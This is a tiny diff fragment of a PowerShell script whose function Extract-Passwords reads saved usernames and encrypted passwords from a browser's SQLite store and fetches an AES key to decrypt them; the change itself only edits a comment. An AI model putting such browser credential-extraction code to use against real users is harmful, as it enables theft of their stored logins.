@@ -186,7 +186,7 @@ function Extract-Passwords {
                 $username = $SQLiteReader["username_value"]
                 $encryptedPassword = $SQLiteReader["password_value"]
 
-                # Decrypt password
+                # Get key and Decrypt password
                 $AESKey = Get-AESKey -BrowserPath $BrowserPath
 
                 try {
